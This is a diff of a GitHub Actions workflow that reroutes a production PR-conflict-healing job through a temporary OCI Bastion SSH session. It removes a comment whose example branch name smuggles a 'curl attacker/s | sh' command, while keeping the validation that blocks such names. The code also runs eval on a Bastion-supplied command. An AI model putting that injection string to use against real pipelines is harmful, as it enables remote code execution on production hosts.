@@ -18,12 +18,17 @@ concurrency:
 jobs:
   heal:
     name: Resolve same-repository PR conflicts with private Oracle Gemini pool
-    runs-on: [self-hosted, Linux, ARM64, shopvivaliz-a1-deploy]
+    runs-on: ubuntu-latest
+    concurrency:
+      group: shopvivaliz-bastion-access
+      cancel-in-progress: false
+    environment: Production
     timeout-minutes: 30
     env:
       REPO: ${{ github.repository }}
-      VM_HOST: 127.0.0.1
-      VM_USER: ubuntu
+      OCI_PROFILE: AGENTS
+      SITE_INSTANCE_NAME: shopvivaliz-free-a1
+      EXPECTED_SITE_HOST: shopvivaliz-free-a1
       GH_TOKEN: ${{ github.token }}
 
     steps:
@@ -42,73 +47,201 @@ jobs:
           python3 -m py_compile trusted/scripts/pr_conflict_gemini_healer.py
           bash -n trusted/scripts/pr_conflict_vm_heal.sh
 
-      - name: Configure verified Oracle SSH
-        shell: bash
+      - name: Configure protected OCI and SSH credentials
         env:
-          PRIMARY_KEY: ${{ secrets.SHOPVIVALIZ_VM_SSH_KEY }}
-          LEGACY_KEY: ${{ secrets.ORACLE_VM_SSH_KEY }}
-          PRIMARY_HOSTS: ${{ secrets.SHOPVIVALIZ_VM_KNOWN_HOSTS }}
-          LEGACY_HOSTS: ${{ secrets.ORACLE_VM_KNOWN_HOSTS }}
-        run: |
-          set -Eeuo pipefail
-          key="${PRIMARY_KEY:-${LEGACY_KEY:-}}"
-          known_hosts="${PRIMARY_HOSTS:-${LEGACY_HOSTS:-}}"
-          test -n "$key" || { echo '::error::Oracle SSH key missing'; exit 1; }
-          test -n "$known_hosts" || { echo '::error::Oracle known_hosts missing'; exit 1; }
-          install -m 700 -d "$HOME/.ssh"
-          printf '%s\n' "$key" > "$HOME/.ssh/id_rsa"
-          printf '%s\n' "$known_hosts" > "$HOME/.ssh/known_hosts"
-          chmod 600 "$HOME/.ssh/id_rsa" "$HOME/.ssh/known_hosts"
-
-      - name: Stage trusted healer in Oracle temporary boundary
-        id: stage
+          OCI_CLI_USER: ${{ secrets.OCI_CLI_USER }}
+          OCI_CLI_TENANCY: ${{ secrets.OCI_CLI_TENANCY }}
+          OCI_CLI_FINGERPRINT: ${{ secrets.OCI_CLI_FINGERPRINT }}
+          OCI_CLI_REGION: ${{ secrets.OCI_CLI_REGION }}
+          OCI_CLI_KEY_CONTENT: ${{ secrets.OCI_CLI_KEY_CONTENT }}
+          VM_KEY: ${{ secrets.SHOPVIVALIZ_VM_SSH_KEY || secrets.ORACLE_VM_SSH_KEY }}
+          VM_HOSTS: ${{ secrets.SHOPVIVALIZ_VM_KNOWN_HOSTS || secrets.ORACLE_VM_KNOWN_HOSTS }}
         shell: bash
         run: |
           set -Eeuo pipefail
-          ssh -o BatchMode=yes -o StrictHostKeyChecking=yes \
-            -o UserKnownHostsFile="$HOME/.ssh/known_hosts" -i "$HOME/.ssh/id_rsa" \
-            "${VM_USER}@${VM_HOST}" \
-            "install -d -m 700 /home/ubuntu/.cache/shopvivaliz-pr-healer"
-          remote_dir="$(ssh -o BatchMode=yes -o StrictHostKeyChecking=yes \
-            -o UserKnownHostsFile="$HOME/.ssh/known_hosts" -i "$HOME/.ssh/id_rsa" \
-            "${VM_USER}@${VM_HOST}" \
-            "mktemp -d /home/ubuntu/.cache/shopvivaliz-pr-healer/run-${GITHUB_RUN_ID}-${GITHUB_RUN_ATTEMPT}-XXXXXX")"
-          remote_base="${remote_dir}/healer"
-          echo "remote_base=$remote_base" >> "$GITHUB_OUTPUT"
-          scp -q \
-            -o BatchMode=yes -o StrictHostKeyChecking=yes \
-            -o UserKnownHostsFile="$HOME/.ssh/known_hosts" -i "$HOME/.ssh/id_rsa" \
-            trusted/scripts/pr_conflict_gemini_healer.py \
-            "${VM_USER}@${VM_HOST}:${remote_base}.py"
-          scp -q \
-            -o BatchMode=yes -o StrictHostKeyChecking=yes \
-            -o UserKnownHostsFile="$HOME/.ssh/known_hosts" -i "$HOME/.ssh/id_rsa" \
-            trusted/scripts/pr_conflict_vm_heal.sh \
-            "${VM_USER}@${VM_HOST}:${remote_base}.sh"
+          for name in OCI_CLI_USER OCI_CLI_TENANCY OCI_CLI_FINGERPRINT OCI_CLI_REGION OCI_CLI_KEY_CONTENT VM_KEY VM_HOSTS; do
+            test -n "${!name:-}" || { echo "::error::Required healer secret missing: $name"; exit 1; }
+          done
+          OCI_CONFIG_FILE="$RUNNER_TEMP/oci-agents/config"
+          OCI_KEY_FILE="$RUNNER_TEMP/oci-agents/key.pem"
+          printf 'OCI_CONFIG_FILE=%s\nOCI_KEY_FILE=%s\n' "$OCI_CONFIG_FILE" "$OCI_KEY_FILE" >> "$GITHUB_ENV"
+          install -m 700 -d "$(dirname "$OCI_CONFIG_FILE")" "$HOME/.ssh"
+          printf '%s' "$OCI_CLI_KEY_CONTENT" > "$OCI_KEY_FILE"
+          chmod 600 "$OCI_KEY_FILE"
+          cat > "$OCI_CONFIG_FILE" <<EOF
+          [AGENTS]
+          user=$OCI_CLI_USER
+          fingerprint=$OCI_CLI_FINGERPRINT
+          tenancy=$OCI_CLI_TENANCY
+          region=$OCI_CLI_REGION
+          key_file=$OCI_KEY_FILE
+          EOF
+          chmod 600 "$OCI_CONFIG_FILE"
 
-      - name: Preflight private Gemini credential pool
+          printf '%s\n' "$VM_KEY" > "$HOME/.ssh/vmkey"
+          printf '%s\n' "$VM_HOSTS" > "$HOME/.ssh/known_hosts"
+          chmod 600 "$HOME/.ssh/vmkey" "$HOME/.ssh/known_hosts"
+
+          ssh-keygen -q -t rsa -b 2048 -N '' -f "$HOME/.ssh/bastion_session_key"
+          chmod 600 "$HOME/.ssh/bastion_session_key" "$HOME/.ssh/bastion_session_key.pub"
+
+      - name: Resolve exact site A1 and active OCI Bastion
         shell: bash
-        env:
-          REMOTE_BASE: ${{ steps.stage.outputs.remote_base }}
         run: |
           set -Eeuo pipefail
-          ssh -o BatchMode=yes -o StrictHostKeyChecking=yes \
-            -o UserKnownHostsFile="$HOME/.ssh/known_hosts" -i "$HOME/.ssh/id_rsa" \
-            "${VM_USER}@${VM_HOST}" \
-            "GEMINI_ENV_FILE=/home/ubuntu/shopvivaliz-deploy/shared/.env python3 '${REMOTE_BASE}.py' --credential-preflight"
+          python3 -m pip install --disable-pip-version-check --quiet oci-cli
+          OCI=(oci --config-file "$OCI_CONFIG_FILE" --profile "$OCI_PROFILE")
+          "${OCI[@]}" iam region list >/dev/null
 
-      - name: Heal and synchronize eligible PR branches
+          query="query instance resources where displayName = '$SITE_INSTANCE_NAME'"
+          count="$("${OCI[@]}" search resource structured-search --query-text "$query" --query 'length(data.items)' --raw-output)"
+          test "$count" = 1 || { echo "::error::Expected one site instance, found $count"; exit 2; }
+          instance_id="$("${OCI[@]}" search resource structured-search --query-text "$query" --query 'data.items[0].identifier' --raw-output)"
+          compartment_id="$("${OCI[@]}" compute instance get --instance-id "$instance_id" --query 'data."compartment-id"' --raw-output)"
+          lifecycle="$("${OCI[@]}" compute instance get --instance-id "$instance_id" --query 'data."lifecycle-state"' --raw-output)"
+          test "$lifecycle" = RUNNING || { echo "::error::Site A1 not RUNNING"; exit 3; }
+
+          vnic_id="$("${OCI[@]}" compute vnic-attachment list --compartment-id "$compartment_id" --instance-id "$instance_id" --query 'data[0]."vnic-id"' --raw-output)"
+          site_ip="$("${OCI[@]}" network vnic get --vnic-id "$vnic_id" --query 'data."private-ip"' --raw-output)"
+          subnet_id="$("${OCI[@]}" network vnic get --vnic-id "$vnic_id" --query 'data."subnet-id"' --raw-output)"
+          vcn_id="$("${OCI[@]}" network subnet get --subnet-id "$subnet_id" --query 'data."vcn-id"' --raw-output)"
+          test -n "$site_ip" && test -n "$subnet_id" && test -n "$vcn_id"
+
+          bastions="$("${OCI[@]}" bastion bastion list --compartment-id "$compartment_id" --all)"
+          bastion_id="$(jq -r --arg vcn "$vcn_id" --arg subnet "$subnet_id" '
+            [.data[] | select(."lifecycle-state"=="ACTIVE" and ."target-vcn-id"==$vcn)] as $c
+            | (($c | map(select(."target-subnet-id"==$subnet)) | .[0].id) // ($c[0].id) // empty)
+          ' <<<"$bastions")"
+          test -n "$bastion_id" || { echo "::error::No active Bastion for site VCN"; exit 4; }
+
+          details="$("${OCI[@]}" bastion bastion get --bastion-id "$bastion_id")"
+          test "$(jq -r '.data."target-vcn-id"' <<<"$details")" = "$vcn_id"
+          original_cidrs="$(jq -c '.data."client-cidr-block-allow-list"' <<<"$details")"
+          test "$original_cidrs" != null
+          original_cidrs_b64="$(printf '%s' "$original_cidrs" | base64 -w0)"
+
+          {
+            printf 'SITE_INSTANCE_ID=%s\n' "$instance_id"
+            printf 'SITE_COMPARTMENT_ID=%s\n' "$compartment_id"
+            printf 'SITE_PRIVATE_IP=%s\n' "$site_ip"
+            printf 'BASTION_ID=%s\n' "$bastion_id"
+            printf 'ORIGINAL_BASTION_CIDRS_B64=%s\n' "$original_cidrs_b64"
+          } >> "$GITHUB_ENV"
+          echo "OCI_SITE_AND_BASTION=PASS"
+
+      - name: Open temporary Bastion access for this hosted runner
         shell: bash
-        env:
-          REMOTE_BASE: ${{ steps.stage.outputs.remote_base }}
         run: |
           set -Eeuo pipefail
-          if [[ "$GITHUB_EVENT_NAME" == 'pull_request_target' ]]; then
+          OCI=(oci --config-file "$OCI_CONFIG_FILE" --profile "$OCI_PROFILE")
+          runner_ip="$(curl -fsS --connect-timeout 5 --max-time 10 https://api.ipify.org)"
+          runner_cidr="$(python3 - "$runner_ip" <<'PY'
+          import ipaddress, sys
+          ip=ipaddress.ip_address(sys.argv[1])
+          print(f"{ip}/{32 if ip.version == 4 else 128}")
+          PY
+          )"
+          original_cidrs="$(printf '%s' "$ORIGINAL_BASTION_CIDRS_B64" | base64 -d)"
+          updated_cidrs="$(jq -cn --argjson current "$original_cidrs" --arg cidr "$runner_cidr" '$current + [$cidr] | unique')"
+          "${OCI[@]}" bastion bastion update             --bastion-id "$BASTION_ID"             --client-cidr-list "$updated_cidrs"             --force --wait-for-state SUCCEEDED             --wait-interval-seconds 5 --max-wait-seconds 180 >/dev/null
+          echo "BASTION_ALLOWLIST_UPDATED=true" >> "$GITHUB_ENV"
+
+      - name: Create temporary Bastion SSH session
+        shell: bash
+        run: |
+          set -Eeuo pipefail
+          OCI=(oci --config-file "$OCI_CONFIG_FILE" --profile "$OCI_PROFILE")
+          session_id="$("${OCI[@]}" bastion session create-port-forwarding             --bastion-id "$BASTION_ID"             --ssh-public-key-file "$HOME/.ssh/bastion_session_key.pub"             --target-private-ip "$SITE_PRIVATE_IP"             --target-port 22             --session-ttl 1800             --display-name "shopvivaliz-pr-conflict-healer"             --query 'data.id' --raw-output)"
+          test -n "$session_id"
+          echo "BASTION_SESSION_ID=$session_id" >> "$GITHUB_ENV"
+
+          active=false
+          session_json=''
+          for _ in $(seq 1 60); do
+            session_json="$("${OCI[@]}" bastion session get --session-id "$session_id")"
+            state="$(jq -r '.data."lifecycle-state"' <<<"$session_json")"
+            if [ "$state" = ACTIVE ]; then active=true; break; fi
+            case "$state" in CREATING) sleep 5 ;; FAILED|DELETING|DELETED) break ;; *) sleep 5 ;; esac
+          done
+          test "$active" = true
+          metadata_command="$(jq -r '.data."ssh-metadata".command' <<<"$session_json")"
+          test -n "$metadata_command"
+          printf '%s' "$metadata_command" | base64 -w0 > "$RUNNER_TEMP/bastion-command.b64"
+
+      - name: Heal and synchronize eligible PR branches through private Bastion SSH
+        shell: bash
+        run: |
+          set -Eeuo pipefail
+          metadata_command="$(base64 -d < "$RUNNER_TEMP/bastion-command.b64")"
+          bastion_host="$(python3 - "$metadata_command" <<'PY'
+          import shlex, sys
+          tokens=shlex.split(sys.argv[1])
+          candidates=[t for t in tokens if '@' in t and not t.startswith('-')]
+          if not candidates:
+              raise SystemExit(2)
+          print(candidates[-1].rsplit('@',1)[1])
+          PY
+          )"
+          ssh-keyscan -T 10 "$bastion_host" > "$HOME/.ssh/bastion_known_hosts"
+          test -s "$HOME/.ssh/bastion_known_hosts"
+          chmod 600 "$HOME/.ssh/bastion_known_hosts"
+          cat > "$HOME/.ssh/config" <<EOF
+          Host $bastion_host
+            BatchMode yes
+            ExitOnForwardFailure yes
+            StrictHostKeyChecking yes
+            UserKnownHostsFile $HOME/.ssh/bastion_known_hosts
+          EOF
+          chmod 600 "$HOME/.ssh/config"
+
+          local_port=32239
+          tunnel_command="${metadata_command//<privateKey>/$HOME/.ssh/bastion_session_key}"
+          tunnel_command="${tunnel_command//<localPort>/$local_port}"
+          eval "$tunnel_command" &
+          tunnel_pid=$!
+          cleanup_local() {
+            if kill -0 "$tunnel_pid" 2>/dev/null; then kill "$tunnel_pid"; fi
+          }
+          trap cleanup_local EXIT
+
+          tunnel_ready=false
+          for _ in $(seq 1 20); do
+            if timeout 2 bash -c "</dev/tcp/127.0.0.1/$local_port" 2>/dev/null; then tunnel_ready=true; break; fi
+            sleep 2
+          done
+          test "$tunnel_ready" = true
+
+          SSH_OPTS=(
+            -p "$local_port"
+            -o BatchMode=yes
+            -o ConnectTimeout=10
+            -o HostKeyAlias="$SITE_PRIVATE_IP"
+            -o StrictHostKeyChecking=yes
+            -o UserKnownHostsFile="$HOME/.ssh/known_hosts"
+            -i "$HOME/.ssh/vmkey"
+          )
+          identity="$(ssh "${SSH_OPTS[@]}" ubuntu@127.0.0.1 'printf "%s/%s" "$(hostname)" "$(id -un)"')"
+          test "$identity" = "$EXPECTED_SITE_HOST/ubuntu" || { echo "::error::Site SSH identity mismatch: $identity"; exit 5; }
+
+          ssh "${SSH_OPTS[@]}" ubuntu@127.0.0.1 'install -d -m 700 /home/ubuntu/.cache/shopvivaliz-pr-healer'
+          remote_dir="$(ssh "${SSH_OPTS[@]}" ubuntu@127.0.0.1 'mktemp -d /home/ubuntu/.cache/shopvivaliz-pr-healer/run-XXXXXX')"
+          [[ "$remote_dir" =~ ^/home/ubuntu/\.cache/shopvivaliz-pr-healer/run-[A-Za-z0-9._-]+$ ]]
+          remote_base="$remote_dir/healer"
+          cleanup_remote() {
+            if ! ssh "${SSH_OPTS[@]}" ubuntu@127.0.0.1 "rm -rf -- '${remote_dir}'" >/dev/null 2>&1; then
+              echo "remote_healer_cleanup=best_effort_failed" >&2
+            fi
+          }
+          trap 'cleanup_remote; cleanup_local' EXIT
+          scp -q -P "$local_port"             -o BatchMode=yes -o ConnectTimeout=10             -o HostKeyAlias="$SITE_PRIVATE_IP"             -o StrictHostKeyChecking=yes             -o UserKnownHostsFile="$HOME/.ssh/known_hosts"             -i "$HOME/.ssh/vmkey"             trusted/scripts/pr_conflict_gemini_healer.py             "ubuntu@127.0.0.1:${remote_base}.py"
+          scp -q -P "$local_port"             -o BatchMode=yes -o ConnectTimeout=10             -o HostKeyAlias="$SITE_PRIVATE_IP"             -o StrictHostKeyChecking=yes             -o UserKnownHostsFile="$HOME/.ssh/known_hosts"             -i "$HOME/.ssh/vmkey"             trusted/scripts/pr_conflict_vm_heal.sh             "ubuntu@127.0.0.1:${remote_base}.sh"
+          ssh "${SSH_OPTS[@]}" ubuntu@127.0.0.1             "chmod 700 '${remote_base}.py' '${remote_base}.sh' && GEMINI_ENV_FILE=/home/ubuntu/shopvivaliz-deploy/shared/.env python3 '${remote_base}.py' --credential-preflight"
+
+          if [[ "$GITHUB_EVENT_NAME" == pull_request_target ]]; then
             prs=("${{ github.event.pull_request.number }}")
           else
             mapfile -t prs < <(
-              gh api "repos/${REPO}/pulls?state=open&base=main&per_page=100" \
-                --jq '.[] | select(.draft == false) | .number'
+              gh api "repos/${REPO}/pulls?state=open&base=main&per_page=100" --jq '.[] | select(.draft == false) | .number'
             )
           fi
 
@@ -122,50 +255,40 @@ jobs:
             head_sha="$(jq -r '.head.sha' <<<"$meta")"
             base_ref="$(jq -r '.base.ref' <<<"$meta")"
 
-            if [[ "$state" != 'open' || "$draft" == 'true' || "$head_repo" != "$REPO" || "$base_ref" != 'main' ]]; then
+            if [[ "$state" != open || "$draft" == true || "$head_repo" != "$REPO" || "$base_ref" != main ]]; then
               echo "pr_${pr}_skipped=true"
               continue
             fi
+            [[ "$pr" =~ ^[0-9]+$ ]] || exit 21
+            [[ "$head_ref" =~ ^[A-Za-z0-9._/-]+$ ]] || { echo "pr_${pr}_skipped_unsafe_ref=true"; continue; }
+            [[ "$head_sha" =~ ^[0-9a-f]{40}$ ]] || { echo "pr_${pr}_skipped_unsafe_sha=true"; continue; }
 
-            # Rodada 2 (2026-08-18): head_ref e head_sha sao interpolados numa string
-            # de comando remoto (ssh "... '${head_ref}' ..."). As aspas simples so
-            # protegem enquanto o valor nao contiver uma aspa simples -- e nomes de
-            # branch do Git PODEM conter aspa simples. Sem esta checagem, uma branch
-            # chamada por exemplo x'; curl attacker/s | sh; ' resultaria em execucao
-            # remota de codigo na VM de producao como usuario ubuntu. O repo tem
-            # multiplos agentes autonomos criando branches, entao o vetor nao e so
-            # hipotetico. Nomes de branch e SHAs legitimos sempre casam com os regex
-            # abaixo, entao isto nao afeta o fluxo normal.
-            if [[ ! "$head_ref" =~ ^[A-Za-z0-9._/-]+$ ]]; then
-              echo "pr_${pr}_skipped_unsafe_ref=true"
-              continue
-            fi
-            if [[ ! "$head_sha" =~ ^[0-9a-f]{40}$ ]]; then
-              echo "pr_${pr}_skipped_unsafe_sha=true"
-              continue
-            fi
-
-            ssh -o BatchMode=yes -o StrictHostKeyChecking=yes \
-              -o UserKnownHostsFile="$HOME/.ssh/known_hosts" -i "$HOME/.ssh/id_rsa" \
-              "${VM_USER}@${VM_HOST}" \
-              "bash '${REMOTE_BASE}.sh' '${pr}' '${head_ref}' '${head_sha}' '${REMOTE_BASE}.py'"
+            ssh "${SSH_OPTS[@]}" ubuntu@127.0.0.1               "bash '${remote_base}.sh' '$pr' '$head_ref' '$head_sha' '${remote_base}.py'"
             echo "pr_${pr}_oracle_heal_completed=true"
           done
 
-      - name: Remove Oracle and runner temporary material
+      - name: Restore Bastion policy and cleanup
         if: always()
         shell: bash
-        env:
-          REMOTE_BASE: ${{ steps.stage.outputs.remote_base }}
         run: |
           set -Eeuo pipefail
-          if [[ -n "${REMOTE_BASE:-}" && -r "$HOME/.ssh/id_rsa" && -r "$HOME/.ssh/known_hosts" ]]; then
-            ssh -o BatchMode=yes -o StrictHostKeyChecking=yes \
-              -o UserKnownHostsFile="$HOME/.ssh/known_hosts" -i "$HOME/.ssh/id_rsa" \
-              "${VM_USER}@${VM_HOST}" \
-              "rm -rf -- '${REMOTE_BASE%/*}'"
+          if [ -n "${OCI_CONFIG_FILE:-}" ] && [ -f "$OCI_CONFIG_FILE" ]; then
+            OCI=(oci --config-file "$OCI_CONFIG_FILE" --profile "$OCI_PROFILE")
+            if [ -n "${BASTION_SESSION_ID:-}" ] && "${OCI[@]}" bastion session get --session-id "$BASTION_SESSION_ID" >/dev/null 2>&1; then
+              "${OCI[@]}" bastion session delete --session-id "$BASTION_SESSION_ID" --force >/dev/null
+            fi
+            if [ "${BASTION_ALLOWLIST_UPDATED:-false}" = true ] && [ -n "${ORIGINAL_BASTION_CIDRS_B64:-}" ] && [ -n "${BASTION_ID:-}" ]; then
+              original_cidrs="$(printf '%s' "$ORIGINAL_BASTION_CIDRS_B64" | base64 -d)"
+              "${OCI[@]}" bastion bastion update                 --bastion-id "$BASTION_ID"                 --client-cidr-list "$original_cidrs"                 --force --wait-for-state SUCCEEDED                 --wait-interval-seconds 5 --max-wait-seconds 180 >/dev/null
+              echo "BASTION_ALLOWLIST_RESTORED=PASS"
+            fi
           fi
-          rm -f "$HOME/.ssh/id_rsa" "$HOME/.ssh/known_hosts"
+
+          for file in "$HOME/.ssh/vmkey" "$HOME/.ssh/bastion_session_key" "${OCI_KEY_FILE:-}"; do
+            [ -n "$file" ] && [ -f "$file" ] && shred -u "$file"
+          done
+          rm -f "$HOME/.ssh/bastion_session_key.pub" "$HOME/.ssh/known_hosts" "$HOME/.ssh/bastion_known_hosts" "$HOME/.ssh/config" "$RUNNER_TEMP/bastion-command.b64"
+          if [ -n "${OCI_CONFIG_FILE:-}" ] && [ -f "$OCI_CONFIG_FILE" ]; then shred -u "$OCI_CONFIG_FILE"; fi
 
       - name: Security invariant
         if: always()
@@ -176,4 +299,5 @@ jobs:
           echo 'pr_code_executed_with_runtime_secrets=false'
           echo 'gemini_keys_copied_to_actions=false'
           echo 'github_write_token_copied_to_actions=false'
+          echo 'production_deploy_runner_reserved=true'
           echo 'secret_values_printed=false'
